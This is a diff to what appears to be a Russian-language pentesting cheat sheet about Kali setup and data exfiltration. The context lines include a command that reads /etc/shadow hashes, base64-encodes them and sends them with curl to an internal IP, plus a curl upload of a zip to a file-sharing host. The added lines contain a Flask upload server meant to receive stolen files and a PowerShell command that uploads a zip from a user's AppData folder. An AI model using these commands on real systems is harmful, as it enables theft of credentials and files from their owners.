@@ -353,6 +353,34 @@ sudo grep '\$' /etc/shadow | base64 | tr -d '\n' |xargs -I @ curl http://172.16.
 curl -F file=@/tmp/<redacted>.zip hxxps://store1[.]gofile[.]io/uploadFile
 
 ```
+
+```
+from distutils.log import debug 
+from fileinput import filename 
+from flask import *  
+app = Flask(__name__)   
+  
+#@app.route('/')   
+#def main():   
+#    return render_template("index.html")   
+  
+@app.route('/upload', methods = ['POST'])   
+def success():   
+    if request.method == 'POST':   
+        f = request.files['file'] 
+        f.save(f.filename)   
+        return "File uploaded {}".format(f.filename) 
+  
+if __name__ == '__main__':   
+    app.run(debug=True, port='8080', host='0.0.0.0')
+```
+
+```
+$wc = New-Object System.Net.WebClient
+$resp = $wc.UploadFile(‘http://server/upload’,’ C:\Users\user\AppData\1.zip’)
+
+```
+
 ## Настройка Kali
 
 ```
